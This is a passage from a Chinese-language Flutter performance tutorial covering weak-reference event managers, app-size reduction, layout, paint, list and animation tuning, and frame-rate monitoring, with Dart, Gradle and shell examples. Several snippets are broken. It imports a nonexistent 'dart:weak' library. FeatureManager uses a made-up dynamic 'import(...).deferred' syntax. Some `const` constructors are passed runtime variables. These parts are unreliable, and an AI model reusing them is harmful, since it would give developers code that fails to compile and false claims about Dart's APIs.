  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">List</span>&lt;Item&gt;&gt; loadItems(<span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> start = page * pageSize;
    <span class="hljs-keyword">final</span> end = start + pageSize;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _fetchItems(start, end);
  }
  
  <span class="hljs-comment">// 2. 重用列表项</span>
  <span class="hljs-keyword">static</span> Widget buildReusableListItem(Item item) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> ReusableListItem(item: item);
  }
}
</code></pre>
<h4 data-id="heading-11">优化手段3：WeakReference使用</h4>
<p><strong>是什么</strong>：弱引用允许对象被垃圾回收，即使还有引用指向它。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>打破循环引用</li>
<li>避免因监听器导致的内存泄漏</li>
<li>允许缓存被自动清理</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>事件监听器</li>
<li>缓存实现</li>
<li>观察者模式</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 使用弱引用的事件管理器</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:weak'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventManager</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WeakReference&lt;EventListener&gt;&gt; _listeners = [];
  
  <span class="hljs-keyword">void</span> addListener(EventListener listener) {
    _listeners.add(WeakReference(listener));
  }
  
  <span class="hljs-keyword">void</span> notify(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-comment">// 清理被回收的监听器</span>
    _listeners.removeWhere((ref) =&gt; ref.target == <span class="hljs-keyword">null</span>);
    
    <span class="hljs-comment">// 通知存活的监听器</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> ref <span class="hljs-keyword">in</span> _listeners) {
      ref.target?.onEvent(event);
    }
  }
}

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event);
}

<span class="hljs-comment">// 具体使用</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyWidgetState createState() =&gt; _MyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyWidget</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> EventManager _eventManager;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _eventManager = EventManager();
    _eventManager.addListener(<span class="hljs-keyword">this</span>); 
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-keyword">if</span> (mounted) {
      setState(() {
        <span class="hljs-comment">// 处理事件...</span>
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 不需要手动移除监听器</span>
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h3 data-id="heading-12">三、优化包体积</h3>
<h4 data-id="heading-13">包体积为什么重要？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[包体积过大的影响] --&gt; B[下载量下降]
    A --&gt; C[存储空间占用]
    A --&gt; D[更新频率降低]
    A --&gt; E[低端设备体验差]
    
    F[体积构成分析] --&gt; G[第一位:资源文件]
    F --&gt; H[第二位:Flutter引擎]
    F --&gt; I[第三位:Dart代码]
    F --&gt; J[第四位:三方库]
</code></pre>
<h4 data-id="heading-14">优化手段1：优化资源文件</h4>
<p><strong>是什么</strong>：减少图片、字体等资源文件的大小。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>资源文件通常占用最大体积</li>
<li>未使用的资源白白占用空间</li>
<li>未优化的资源加载慢</li>
</ul>
<p><strong>优化手段</strong>：</p>
<ol>
<li>删除未使用资源</li>
<li>压缩图片格式</li>
<li>字体子集化</li>
<li>按需加载大资源</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml优化示例</span>
<span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">assets:</span>
    <span class="hljs-comment"># 不要导入整个目录</span>
    <span class="hljs-comment"># - assets/images/</span>
    
    <span class="hljs-comment"># 精确指定需要的文件</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/icon.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/logo.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/splash.png</span>
    
    <span class="hljs-comment"># 使用WebP格式</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/background.webp</span>
    
  <span class="hljs-attr">fonts:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">family:</span> <span class="hljs-string">NotoSans</span>
      <span class="hljs-attr">fonts:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">asset:</span> <span class="hljs-string">assets/fonts/NotoSans-Regular.ttf</span>
          <span class="hljs-comment"># 只包含需要的字体</span>
          <span class="hljs-comment"># - asset: assets/fonts/NotoSans-Bold.ttf</span>
          <span class="hljs-comment">#   weight: 700</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 资源优化常用的终端命令：</span>
<span class="hljs-comment"># 1. 查找大文件</span>
find . -name <span class="hljs-string">"*.png"</span> -size +100k -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -lh {} \;

<span class="hljs-comment"># 2. 转换为WebP</span>
cwebp -q 80 input.png -o output.webp

<span class="hljs-comment"># 3. 字体子集化</span>
pyftsubset font.ttf --text-file=chinese_chars.txt
</code></pre>
<h4 data-id="heading-15">优化手段2：代码混淆</h4>
<p><strong>是什么</strong>：通过混淆、压缩和优化减少代码体积。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>移除未使用的代码</li>
<li>缩短标识符名称</li>
<li>优化控制流</li>
</ul>
<p><strong>优化工具</strong>：</p>
<ol>
<li>R8/ProGuard（Android）</li>
<li>Dart编译优化</li>
<li>Tree Shaking</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-gradle" lang="gradle">// android/app/build.gradle
android {
    buildTypes {
        release {
            // 启用代码优化
            minifyEnabled true
            shrinkResources true
            
            // 使用R8
            useProguard true
            
            proguardFiles getDefaultProguardFile(
                'proguard-android-optimize.txt'
            ), 'proguard-rules.pro'
        }
    }
}
</code></pre>
<pre><code class="hljs language-pro" lang="pro"># proguard-rules.pro
# 保留Flutter必要类
-keep class io.flutter.app.** { *; }
-keep class io.flutter.plugin.** { *; }

# 移除日志
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
</code></pre>
<h4 data-id="heading-16">优化手段3：按需加载与延迟导入</h4>
<p><strong>是什么</strong>：将应用拆分为多个模块，按需加载。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>减少初始加载体积</li>
<li>节省用户流量，提高启动速度</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>deferred import</li>
<li>动态特性模块</li>
<li>代码分割</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 延迟导入</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:heavy_library/heavy_library.dart'</span> <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> heavy;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyLoadWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LazyLoadWidgetState createState() =&gt; _LazyLoadWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LazyLoadWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LazyLoadWidget</span>&gt; </span>{
  <span class="hljs-built_in">bool</span> _isLoaded = <span class="hljs-keyword">false</span>;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; _loadLibrary() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> heavy.loadLibrary();
    setState(() =&gt; _isLoaded = <span class="hljs-keyword">true</span>);
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">if</span> (!_isLoaded) {
      <span class="hljs-keyword">return</span> ElevatedButton(
        onPressed: _loadLibrary,
        child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'加载功能模块'</span>),
      );
    }
    
    <span class="hljs-keyword">return</span> heavy.HeavyWidget();
  }
}

<span class="hljs-comment">// 动态特性加载</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FeatureManager</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; _loadedFeatures = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">dynamic</span>&gt; loadFeature(<span class="hljs-built_in">String</span> featureName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_loadedFeatures.containsKey(featureName)) {
      <span class="hljs-keyword">return</span> _loadedFeatures[featureName];
    }
    
    <span class="hljs-keyword">switch</span> (featureName) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'payment'</span>:
        <span class="hljs-keyword">final</span> payment = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/payment.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = payment;
        <span class="hljs-keyword">return</span> payment;
        
      <span class="hljs-keyword">case</span> <span class="hljs-string">'analytics'</span>:
        <span class="hljs-comment">// 按需加载分析模块</span>
        <span class="hljs-keyword">final</span> analytics = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/analytics.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = analytics;
        <span class="hljs-keyword">return</span> analytics;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
  }
}
</code></pre>
<h4 data-id="heading-17">优化手段4：优化应用Bundle</h4>
<p><strong>是什么</strong>：利用平台特性进行智能分发。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>Android App Bundle减少下载体积</li>
<li>iOS App Thinning按设备分发</li>
<li>支持动态功能模块</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>Android App Bundle</li>
<li>iOS App Thinning</li>
<li>动态功能交付</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-gradle" lang="gradle">// 启用Android App Bundle
android {
    bundle {
        language {
            enableSplit = true  // 按语言拆分
        }
        density {
            enableSplit = true  // 按屏幕密度拆分
        }
        abi {
            enableSplit = true  // 按CPU架构拆分
        }
    }
}
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 构建命令</span>
<span class="hljs-comment"># 1. 构建Android App Bundle</span>
flutter build appbundle

<span class="hljs-comment"># 2. 分析Bundle</span>
flutter build appbundle --target-platform android-arm64 --analyze-size

<span class="hljs-comment"># 3. 测试Bundle</span>
bundletool build-apks --bundle=app.aab --output=app.apks
bundletool install-apks --apks=app.apks
</code></pre>
<h3 data-id="heading-18">四、优化渲染性能</h3>
<h4 data-id="heading-19">什么导致了渲染卡顿？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[渲染卡顿原因] --&gt; B[复杂布局计算]
    A --&gt; C[频繁绘制操作]
    A --&gt; D[图层合成开销]
    A --&gt; E[GPU负载过高]
    
    B --&gt; F[嵌套过深]
    B --&gt; G[约束传递频繁]
    
    C --&gt; H[过度使用阴影]
    C --&gt; I[透明度处理不当]
    C --&gt; J[频繁裁剪操作]
    
    D --&gt; K[RepaintBoundary过多]
    D --&gt; L[图层混合模式复杂]
</code></pre>
<h4 data-id="heading-20">优化手段1：优化布局性能</h4>
<p><strong>是什么</strong>：减少布局计算的时间和复杂度。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>布局是渲染管线中最耗时的阶段之一</li>
<li>复杂的布局导致界面卡顿</li>
<li>不当的约束传递引发连锁重排</li>
</ul>
<p><strong>优化手段</strong>：</p>
<ol>
<li>减少Widget嵌套深度</li>
<li>使用合适的布局Widget</li>
<li>避免过度使用Flexible/Expanded</li>
<li>使用CustomSingleChildLayout/CustomMultiChildLayout</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：深度嵌套</span>
Widget buildBadLayout() {
  <span class="hljs-keyword">return</span> Container(
    child: Column(
      children: [
        Container(
          child: Row(
            children: [
              Container(child: Text(<span class="hljs-string">'A'</span>)),
              Container(child: Text(<span class="hljs-string">'B'</span>)),
              Container(child: Text(<span class="hljs-string">'C'</span>)),
            ],
          ),
        ),
        <span class="hljs-comment">// 更多嵌套...</span>
      ],
    ),
  );
}

<span class="hljs-comment">// 优化的布局</span>
Widget buildGoodLayout() {
  <span class="hljs-keyword">return</span> Column(
    children: [
      Row(
        children: <span class="hljs-keyword">const</span> [
          Text(<span class="hljs-string">'A'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'B'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'C'</span>),
        ],
      ),
      <span class="hljs-comment">// 使用间隔Widget替代多余的Container</span>
      <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">16</span>),
    ],
  );
}

<span class="hljs-comment">// 使用CustomMultiChildLayout优化复杂布局</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedLayout</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> CustomMultiChildLayout(
      delegate: _LayoutDelegate(),
      children: [
        LayoutId(
          id: _LayoutItem.header,
          child: <span class="hljs-keyword">const</span> HeaderWidget(),
        ),
        LayoutId(
          id: _LayoutItem.content,
          child: <span class="hljs-keyword">const</span> ContentWidget(),
        ),
        LayoutId(
          id: _LayoutItem.footer,
          child: <span class="hljs-keyword">const</span> FooterWidget(),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LayoutDelegate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiChildLayoutDelegate</span> </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> performLayout(Size size) {
    <span class="hljs-comment">// 一次性计算所有子项的位置和大小</span>
    <span class="hljs-keyword">final</span> headerSize = layoutChild(
      _LayoutItem.header,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> footerSize = layoutChild(
      _LayoutItem.footer,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> contentConstraints = BoxConstraints(
      maxWidth: size.width,
      maxHeight: size.height - headerSize.height - footerSize.height,
    );
    
    layoutChild(_LayoutItem.content, contentConstraints);
    
    <span class="hljs-comment">// 定位子项</span>
    positionChild(_LayoutItem.header, Offset.zero);
    positionChild(_LayoutItem.content, Offset(<span class="hljs-number">0</span>, headerSize.height));
    positionChild(_LayoutItem.footer, 
        Offset(<span class="hljs-number">0</span>, size.height - footerSize.height));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> shouldRelayout(<span class="hljs-keyword">covariant</span> MultiChildLayoutDelegate oldDelegate) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
  }
}

<span class="hljs-keyword">enum</span> _LayoutItem { header, content, footer }
</code></pre>
<h4 data-id="heading-21">优化手段2：优化绘制性能</h4>
<p><strong>是什么</strong>：减少复杂绘制操作频率。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>复杂的绘制操作消耗GPU资源</li>
<li>过度绘制浪费渲染时间</li>
<li>不当的效果使用导致性能变差</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>避免过度使用阴影</li>
<li>谨慎使用透明度</li>
<li>减少裁剪操作</li>
<li>使用缓存图片</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 优化绘制</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PaintOptimization</span> </span>{
  <span class="hljs-comment">// 1. 优化阴影</span>
  <span class="hljs-keyword">static</span> BoxDecoration optimizedShadow() {
    <span class="hljs-keyword">return</span> BoxDecoration(
      color: Colors.white,
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      <span class="hljs-comment">// 过度使用阴影</span>
      <span class="hljs-comment">// boxShadow: [</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 16),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 8),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 4),</span>
      <span class="hljs-comment">// ],</span>
      
      <span class="hljs-comment">// 优化后</span>
      boxShadow: <span class="hljs-keyword">const</span> [
        BoxShadow(
          color: Colors.black12,
          blurRadius: <span class="hljs-number">4</span>,
          spreadRadius: <span class="hljs-number">0</span>,
          offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>),
        ),
      ],
    );
  }
  
  <span class="hljs-comment">// 2. 优化透明度</span>
  <span class="hljs-keyword">static</span> Widget optimizedOpacity() {
    <span class="hljs-comment">// 使用Opacity Widget</span>
    <span class="hljs-comment">// return Opacity(</span>
    <span class="hljs-comment">//   opacity: 0.5,</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// 使用颜色透明度</span>
    <span class="hljs-keyword">return</span> Container(
      color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
    );
    
    <span class="hljs-comment">// 对于静态半透明，使用ColorFiltered</span>
    <span class="hljs-comment">// return ColorFiltered(</span>
    <span class="hljs-comment">//   colorFilter: ColorFilter.mode(</span>
    <span class="hljs-comment">//     Colors.white.withOpacity(0.5),</span>
    <span class="hljs-comment">//     BlendMode.modulate,</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
  }
  
  <span class="hljs-comment">// 3. 优化裁剪</span>
  <span class="hljs-keyword">static</span> Widget optimizedClip() {
    <span class="hljs-comment">// 复杂裁剪</span>
    <span class="hljs-comment">// return ClipPath(</span>
    <span class="hljs-comment">//   clipper: ComplexClipper(),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// 简单裁剪</span>
    <span class="hljs-keyword">return</span> ClipRRect(
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      child: Container(color: Colors.blue),
    );
    
    <span class="hljs-comment">// 使用装饰而不是裁剪</span>
    <span class="hljs-comment">// return Container(</span>
    <span class="hljs-comment">//   decoration: BoxDecoration(</span>
    <span class="hljs-comment">//     color: Colors.blue,</span>
    <span class="hljs-comment">//     borderRadius: BorderRadius.circular(8),</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">// );</span>
  }
}
</code></pre>
<h4 data-id="heading-22">优化手段3：优化列表性能</h4>
<p><strong>是什么</strong>：针对ListView、GridView等可滚动组件进行优化。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>几乎所有的应用都会用到列表组件，他的性能好坏直接影响用户体验</li>
<li>不当的列表实现导致滚动卡顿</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>使用正确的ListView构造函数</li>
<li>设置合理的缓存范围</li>
<li>优化列表项构建</li>
<li>使用Sliver系列组件</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListOptimization</span> </span>{
  <span class="hljs-comment">// 1. 选择合适的ListView构造函数</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedList(<span class="hljs-built_in">List</span>&lt;Item&gt; items) {
    <span class="hljs-keyword">return</span> ListView.builder(
      itemCount: items.length,
      
      <span class="hljs-comment">// 优化参数</span>
      addAutomaticKeepAlives: <span class="hljs-keyword">false</span>, <span class="hljs-comment">// 手动控制状态保持</span>
      addRepaintBoundaries: <span class="hljs-keyword">true</span>,   
      
      <span class="hljs-comment">// 缓存范围，预渲染区域</span>
      cacheExtent: <span class="hljs-number">1000</span>, <span class="hljs-comment">// 默认250，增大可减少滚动卡顿</span>
      
      <span class="hljs-comment">// 如果item高度固定，使用itemExtent提高性能</span>
      <span class="hljs-comment">// itemExtent: 100,</span>
      
      <span class="hljs-comment">// 或者使用prototypeItem</span>
      <span class="hljs-comment">// prototypeItem: const ListTile(title: Text('原型')),</span>
      
      itemBuilder: (context, index) {
        <span class="hljs-keyword">return</span> _buildOptimizedItem(items[index]);
      },
    );
  }
  
  <span class="hljs-comment">// 2. 优化列表项构建</span>
  <span class="hljs-keyword">static</span> Widget _buildOptimizedItem(Item item) {
    <span class="hljs-keyword">return</span> RepaintBoundary(
      child: KeepAlive(
        keepAlive: _shouldKeepAlive(item),
        child: <span class="hljs-keyword">const</span> OptimizedListItem(item: item),
      ),
    );
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> _shouldKeepAlive(Item item) {
    <span class="hljs-keyword">return</span> item.isImportant;
  }
  
  <span class="hljs-comment">// 3. 使用CustomScrollView和Slivers</span>
  <span class="hljs-keyword">static</span> Widget buildCustomScrollView() {
    <span class="hljs-keyword">return</span> CustomScrollView(
      slivers: [
        <span class="hljs-comment">// 固定AppBar</span>
        <span class="hljs-keyword">const</span> SliverAppBar(pinned: <span class="hljs-keyword">true</span>, expandedHeight: <span class="hljs-number">200</span>),
        
        <span class="hljs-comment">// 固定Header</span>
        <span class="hljs-keyword">const</span> SliverToBoxAdapter(
          child: Padding(
            padding: EdgeInsets.all(<span class="hljs-number">16</span>),
            child: Text(<span class="hljs-string">'商品列表'</span>),
          ),
        ),
        
        <span class="hljs-comment">// 使用SliverFixedExtentList</span>
        SliverFixedExtentList(
          itemExtent: <span class="hljs-number">100</span>, 
          delegate: SliverChildBuilderDelegate(
            (context, index) =&gt; _buildOptimizedItem(_getItem(index)),
            childCount: <span class="hljs-number">1000</span>,
          ),
        ),
      ],
    );
  }
}
</code></pre>
<h4 data-id="heading-23">优化手段4：优化动画性能</h4>
<p><strong>是什么</strong>：优化动画的流畅度和性能。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>动画流畅度是用户体验的最直观感受，复杂的动画会消耗大量资源，也会导致卡顿</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>使用AnimatedWidget/AnimatedBuilder</li>
<li>避免在动画中调用setState</li>
<li>使用TweenAnimationBuilder</li>
<li>合理使用物理动画</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimationOptimization</span> </span>{
  <span class="hljs-comment">// 1. 使用AnimatedBuilder避免不必要的重建</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedAnimation() {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _animationController,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Transform.rotate(
          angle: _animationController.value * <span class="hljs-number">2</span> * pi,
          child: child,
        );
      },
      child: <span class="hljs-keyword">const</span> Icon(Icons.refresh), 
    );
  }
  
  <span class="hljs-comment">// 2. 使用TweenAnimationBuilder动画</span>
  <span class="hljs-keyword">static</span> Widget buildTweenAnimation() {
    <span class="hljs-keyword">return</span> TweenAnimationBuilder&lt;<span class="hljs-built_in">double</span>&gt;(
      tween: Tween(begin: <span class="hljs-number">0</span>, end: <span class="hljs-number">1</span>),
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
      builder: (context, value, child) {
        <span class="hljs-keyword">return</span> Opacity(
          opacity: value,
          child: Transform.scale(scale: value, child: child),
        );
      },
      child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'淡入放大动画'</span>),
    );
  }
  
  <span class="hljs-comment">// 3. 优化物理动画</span>
  <span class="hljs-keyword">static</span> Widget buildPhysicsAnimation() {
    <span class="hljs-keyword">return</span> Draggable(
      feedback: Material(
        child: Container(
          width: <span class="hljs-number">100</span>,
          height: <span class="hljs-number">100</span>,
          color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
        ),
      ),
      childWhenDragging: Container(),
      child: Container(
        width: <span class="hljs-number">100</span>,
        height: <span class="hljs-number">100</span>,
        color: Colors.blue,
      ),
      feedbackOffset: Offset.zero,
    );
  }
}
</code></pre>
<h3 data-id="heading-24">五、性能监控</h3>
<h4 data-id="heading-25">工具链</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[性能监控工具链] --&gt; B[开发阶段]
    A --&gt; C[测试阶段]
    A --&gt; D[生产阶段]
    
    B --&gt; E[Flutter DevTools]
    B --&gt; F[Dart Observatory]
    B --&gt; G[性能覆盖层]
    
    C --&gt; H[自动化测试]
    C --&gt; I[性能测试]
    C --&gt; J[内存泄漏测试]
    
    D --&gt; K[APM集成]
    D --&gt; L[崩溃监控]
    D --&gt; M[用户行为分析]
</code></pre>
<h4 data-id="heading-26">工具使用</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 1. 性能覆盖层</span>
<span class="hljs-keyword">void</span> enablePerformanceOverlay() {
  runApp(
    MaterialApp(
      home: <span class="hljs-keyword">const</span> MyApp(),
      showPerformanceOverlay: <span class="hljs-keyword">true</span>, 
      
      <span class="hljs-comment">// 其他调试选项</span>
      checkerboardRasterCacheImages: <span class="hljs-keyword">true</span>,
      checkerboardOffscreenLayers: <span class="hljs-keyword">true</span>,
      showSemanticsDebugger: <span class="hljs-keyword">true</span>,
    ),
  );
}

<span class="hljs-comment">// 2. 自定义性能监控</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PerformanceMonitor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  
  <span class="hljs-keyword">const</span> PerformanceMonitor({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _PerformanceMonitorState createState() =&gt; _PerformanceMonitorState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_PerformanceMonitorState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">PerformanceMonitor</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">WidgetsBindingObserver</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">double</span>&gt; _frameTimes = [];
  <span class="hljs-built_in">double</span> _fps = <span class="hljs-number">0</span>;
  <span class="hljs-built_in">int</span> _droppedFrames = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    WidgetsBinding.instance!.addObserver(<span class="hljs-keyword">this</span>);
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didChangeMetrics() {
    <span class="hljs-comment">// 监控帧率</span>
    SchedulerBinding.instance!.addPostFrameCallback((timeStamp) {
      _recordFrameTime(timeStamp);
    });
  }
  
  <span class="hljs-keyword">void</span> _recordFrameTime(<span class="hljs-built_in">Duration</span> timeStamp) {
    <span class="hljs-keyword">final</span> now = timeStamp.inMicroseconds / <span class="hljs-number">1000</span>;
    _frameTimes.add(now);
    
    <span class="hljs-comment">// 保留最近1秒的数据</span>
    <span class="hljs-keyword">final</span> oneSecondAgo = now - <span class="hljs-number">1000</span>;
    _frameTimes.removeWhere((time) =&gt; time &lt; oneSecondAgo);
    
    <span class="hljs-comment">// 计算FPS</span>
    <span class="hljs-keyword">if</span> (_frameTimes.length &gt;= <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">final</span> fps = (_frameTimes.length - <span class="hljs-number">1</span>) * <span class="hljs-number">1000</span> / 
                 (_frameTimes.last - _frameTimes.first);
      
      <span class="hljs-comment">// 计算掉帧</span>
      <span class="hljs-keyword">final</span> frameInterval = _frameTimes.last - 
                           _frameTimes[_frameTimes.length - <span class="hljs-number">2</span>];
